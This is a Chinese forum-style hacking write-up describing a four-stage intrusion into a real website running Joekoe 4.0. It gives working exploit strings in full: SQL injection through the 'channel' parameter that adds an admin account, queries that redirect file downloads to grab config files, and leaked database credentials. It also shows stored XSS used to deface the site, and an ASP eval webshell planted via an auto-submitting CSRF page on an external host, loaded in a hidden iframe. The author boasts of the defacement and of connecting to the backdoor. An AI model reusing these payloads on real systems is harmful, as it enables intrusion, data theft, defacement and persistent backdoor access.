@@ -1,0 +1,114 @@
+
+安全检测黑客防线
+
+乔客（joekoe） 4.0 sql 未公布漏洞
+
+  一步曲.
+
+  入侵我们要找它的网站的漏洞点。 我们随便打开个页面< [首发漏洞]迅雷0day>.看到它的URL连接是HTML的，静态页面不能利用。
+
+我们再找 看到了 http://www.hacker.com.cn/common/comment.asp?channel=down&dataid=14789
+注入大家看多了，我们来在后面
+
+加个'
+http://www.hacker.com.cn/common/comment.asp?channel=down&dataid=14789
+
+报错了  
+
+and 1=1
+and 1=2
+
+都没有报错，郁闷。。难道没有漏洞？不对 刚才报错的那句错误信息:
+
+select count(*) from db_sys_review where nsort='down'' and iid=14789 and r_hidden=1
+
+引起我的注意，'并没有过滤 channel字段没有任何过滤就放入了数据库。
+
+而且 
+
+原始错误:
+Error #-2147217900, 字符串 'down' and iid=14789 and r_hidden=1' 之前有未闭合的引号。 
+
+Microsoft OLE DB Provider for SQL Server
+
+既然是SQL版本的那给我们很多便利
+
+我们本机架设个.
+
+提交 ';insert into db_sys_manager (m_user,m_password,m_grade,m_hidden) values('czp','526a568e057b69f9',10,0);--
+它的语句就会变成
+select count(*) from db_sys_review where nsort='down';insert into db_sys_manager (m_user,m_password,m_grade,m_hidden) values('czp','526a568e057b69f9',10,0);-- and iid=14789 and r_hidden=1  
+
+数据库中给我加入了一个用户名为czp 密码为526a568e057b69f9的管理员帐号。
+高兴~我们打开它的后台。 安全密码： 我们查看本机源代码.
+common\config\manage\configure.asp 记录安全密码。
+
+   二步曲. 
+   继续昨天我们的入侵。既然我们进不了后台。那么多我们加管理号已经无任何意义了。（但是可以改我们会员权限。呵呵加个VIP帐号）
+
+继续寻找别的漏洞。 前几天乔客暴了个上传漏洞。可是试了试并没有成功。我再论坛随便发了个帖子，上传了个软件。
+
+发现他的下载连接是http://www.hacker.com.cn/common/download.asp?module=upload&id=849
+849代表我上传文件的ID号。 那我ID号在那记录那。很显然在数据库里。
+
+本机测试 u_id是对应提交的ID号码 。u_urL对应的是文件路径。
+
+默认在upload中,我们将id=1的u_url改成../common/config/manage/configure.asp再提交http://127.0.0.1/common/download.asp?module=upload&id=1
+
+http://127.0.0.1/common/download.asp?module=upload&id=1
+
+成功把本机的common/config/manage/configure.asp配置文件下载下来，http://www.hacker.com.cn/common/comment.asp?channel=down';UPDATE db_sys_upload SET u_filename='common/config/manage/configure.asp' WHERE u_id='850';--
+
+再提交
+http://www.hacker.com.cn/common/download.asp?module=upload&id=850
+
+http://www.hacker.com.cn/common/comment.asp?channel=down;UPDATE db_sys_upload SET u_filename='common/config/configure.asp' WHERE u_id='851';--
+
+再提交
+http://www.hacker.com.cn/common/download.asp?module=upload&id=851
+
+成功的把common/config/manage/configure.asp和common/config/configure.asp文件下载下来 得到了2个重要数据
+CONST DB_TYPE                            = 1
+CONST DB_TYPENAME                        = "sql"
+CONST DB_DATABASE                        = "db_hacker"
+CONST DB_SERVER                          = "192.168.0.2"
+CONST DB_USERNAME                        = "hacker"
+CONST DB_PASSWORD                        = "db_hacker_new.888"
+const MANAGE_SECURE_CODE                 = "a485beeecb62bb0f"
+安全密码，加密，破不开郁闷，内网数据库。。
+     
+
+三步曲
+
+其实中间想到了一个方法，既然能修改数据库，我们直接写个跨站语句。当管理员进后台后将安全密码改为空。但是当安全密码没有了，
+
+管理员很容易发现。而且我也没成功。后面的方法和这个一个方法，所以后面细讲。当时没有得到SHELL我们直接写个黑页挂上面吧。
+http://www.hacker.com.cn/common/comment.asp?channel=news';UPDATE db_bbs_class SET f_power='</script></div>")<script>document.body.bgColor="black";document.body.innerHTML="<center><font color=green size=3>HackEd BY ヅ深蓝ぺT透 QQ 12941 </font>";</script>("' WHERE f_name='wtf'--
+
+大家可以自己研究下。论坛跨站。把他斑竹为wtf的改成我们的跨站语句，没有任何过滤执行了 如图（图八）
+哈。对方管理员郁闷了。两个小时后才找到代码所在。站恢复了 ，而且后台也限制了IP。 它以为我进后台改的。郁闷哈。限制IP了进不了后台了，就算拿到安全密码也没用了。哎，玩火玩大了。[img]http://x-xox-x.com/tupian/74-8.jpg[/img]
+      四步曲
+    
+   之前我们我想到了后台跨站让管理员自动提交语句把安全密码去掉，后来知道了写SHELL方法才知道自己多笨哦，看我们怎么得到SHELL我们本机架设，关键配置的最后一项将Scripting.Dictionary改成Scripting.Dictionary"%><%eval request("#")%><%CONST OBJECT_TYPENAME_XMLDOM1                = "Msxml.DOMDocument 提交。
+就会在/common/config/configure.asp文件生成一句话后门，而且站点不会有任何的报错。连接[url=http://127.0.0.1/common/config/configure.asp]链接标记http://127.0.0.1/common/config/configure.asp[/url]就可以了.
+我们在本机把关键配置 所有代码保存一下 在将POST补全[url=http://www.hacker.com.cn/admin/channel/system/configure.asp?channel=&key=configure]链接标记http://www.hacker.com.cn/admin/c ... nnel=&key=configure[/url]
+然后将数据库，连接帐号等信息改成它的
+CONST DB_TYPE                                = 1
+CONST DB_TYPENAME                        = "sql"
+CONST DB_DATABASE                        = "db_hacker"
+CONST DB_SERVER                                = "192.168.0.2"
+CONST DB_USERNAME                        = "hacker"
+CONST DB_PASSWORD                        = "db_hacker_new.888"
+最后一项Dict对像名 Scripting.Dictionary 改成Scripting.Dictionary"%><%eval request("#")%><%CONST OBJECT_TYPENAME_XMLDOM1                = "Msxml.DOMDocument 切记将value="" 双引号改成单引号。
+提交编辑代码后加上自动提交代码
+<script language="javascript">
+this.document.forms[0].submit()
+</script>
+代码保存成1.HTM 上传到空间中去比如[url=http://www.6.cn/1.htm]链接标记http://www.6.cn/1.htm[/url]
+提交后台跨站代码 
+[url=http://127.0.0.1/common/comment.asp?channel=news]链接标记http://127.0.0.1/common/comment.asp?channel=news'[/url];UPDATE db_sys_server SET s_name='<iframe src=http://www.6.cn/1.htm width=0 height=0></iframe>' WHERE id='1';--
+当对方添加软件的时候会默默的打开[url=http://www.6.cn/1.htm]链接标记http://www.6.cn/1.htm[/url] 将后门写入配置文件而且不会报错。 看不懂的朋友可以本机架设下，很简单的。
+  三天后我们用后门连接下发现连接成功了 （图九）
+[img]http://x-xox-x.com/tupian/74-9.jpg[/img]
+[img]http://x-xox-x.com/tupian/74-10.jpg[/img]
+没什么高深的技术，牛人不要见笑。。。。
